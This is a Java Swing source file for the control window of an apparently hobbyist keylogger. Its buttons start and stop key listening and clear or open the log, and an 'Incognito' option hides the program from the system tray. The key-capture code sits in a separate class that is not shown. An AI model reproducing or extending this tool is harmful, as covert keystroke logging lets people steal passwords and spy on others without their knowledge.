/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package gui;

import java.awt.Image;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import javax.imageio.ImageIO;
import keylogger.KeyFunctions;

/**
 *
 * @author Shadow
 */
public class mainFrame extends javax.swing.JFrame {
public static mainFrame frame;
public static TrayIcon myTray;
public static SystemTray st = SystemTray.getSystemTray();

    
    /**
     * Creates new form mainFrame
     */
    public mainFrame() {
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        listenbtn = new javax.swing.JButton();
        stoplistenbtn = new javax.swing.JButton();
        hidecheck = new javax.swing.JCheckBox();
        clearlogbtn = new javax.swing.JButton();
        openlogbtn = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        listenbtn.setText("Start Listen");
        listenbtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                listenbtnActionPerformed(evt);
            }
        });

        stoplistenbtn.setText("Stop Listen");
        stoplistenbtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                stoplistenbtnActionPerformed(evt);
            }
        });

        hidecheck.setText("Hide From System Tray On Start");

        clearlogbtn.setText("Clear Log");
        clearlogbtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clearlogbtnActionPerformed(evt);
            }
        });

        openlogbtn.setText("Open Log");
        openlogbtn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                openlogbtnActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGap(89, 89, 89)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(hidecheck, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(clearlogbtn, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createSequentialGroup()
                        .addComponent(listenbtn, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(stoplistenbtn, javax.swing.GroupLayout.DEFAULT_SIZE, 100, Short.MAX_VALUE))
                    .addComponent(openlogbtn, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addGap(93, 93, 93))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(listenbtn)
                    .addComponent(stoplistenbtn))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(clearlogbtn)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(openlogbtn)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(hidecheck)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void listenbtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_listenbtnActionPerformed
        KeyFunctions.startListen(frame);
        KeyFunctions.isListening = true;
        if(hidecheck.isSelected()){
            KeyFunctions.incognito(frame, st, myTray);
        }
    }//GEN-LAST:event_listenbtnActionPerformed

    private void stoplistenbtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_stoplistenbtnActionPerformed
        KeyFunctions.stopListen(frame);
        KeyFunctions.isListening = false;
    }//GEN-LAST:event_stoplistenbtnActionPerformed

    private void clearlogbtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clearlogbtnActionPerformed
        KeyFunctions.clearLog(frame);
    }//GEN-LAST:event_clearlogbtnActionPerformed

    private void openlogbtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_openlogbtnActionPerformed
        KeyFunctions.openLog(frame);
    }//GEN-LAST:event_openlogbtnActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(mainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(mainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(mainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(mainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                PopupMenu pum = new PopupMenu();
                MenuItem incognito = new MenuItem("Incognito");
                MenuItem settings = new MenuItem("Settings");
                MenuItem exit = new MenuItem("Exit");
                
                pum.add(settings);
                pum.add(incognito);
                pum.add(exit);
                
                
            try {
                Image img = ImageIO.read(new File("img.jpg"));
                myTray = new TrayIcon(img);
                myTray.setImageAutoSize(true);
                myTray.setPopupMenu(pum);
                st.add(myTray);
                } catch (Exception ex) {}
            
                settings.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                       KeyFunctions.maximizeFromTray(frame);
                    }
                });
                incognito.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                       KeyFunctions.incognito(frame,st, myTray);
                    }
                });
                exit.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        KeyFunctions.exit();
                    }
                });
                
                frame=new mainFrame();
                frame.addWindowListener(new WindowAdapter(){
                public void windowIconified(WindowEvent e){
                        KeyFunctions.minimizeToTray(frame);
                        }
                  });
                
                frame.setVisible(true);
                
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton clearlogbtn;
    private javax.swing.JCheckBox hidecheck;
    private javax.swing.JButton listenbtn;
    private javax.swing.JButton openlogbtn;
    private javax.swing.JButton stoplistenbtn;
    // End of variables declaration//GEN-END:variables
}
